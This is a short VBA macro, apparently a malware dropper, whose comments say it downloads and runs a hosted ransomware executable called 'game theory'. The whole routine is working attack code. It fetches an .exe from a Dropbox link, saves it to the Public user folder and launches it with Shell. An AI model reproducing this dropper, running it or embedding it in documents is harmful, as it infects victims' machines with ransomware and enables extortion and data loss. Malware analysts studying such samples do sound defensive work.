Sub download_and_run_exe()
    '
    ' Downloads and runs pre-packaged and hosted "game theory"
    ' ransomware exe. This version of the code is unobfuscated and
    ' is easily detected by antiviruses.
    '
    ' Code adapted from: http://stackoverflow.com/a/2973344 
    '


    Dim xHttp: Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "https://www.dropbox.com/s/4z8j5uou5vlckwr/test.exe?dl=1", False
    xHttp.Send

    With bStrm
            .Type = 1 ' // binary stream
            .Open
            .write xHttp.responseBody
	    .savetofile "C:\Users\Public\gametheory.exe", 2 '// write malware exe to temp file this process has permissions to
    End With
    
    Shell ("C:\Users\Public\gametheory.exe")

End Sub
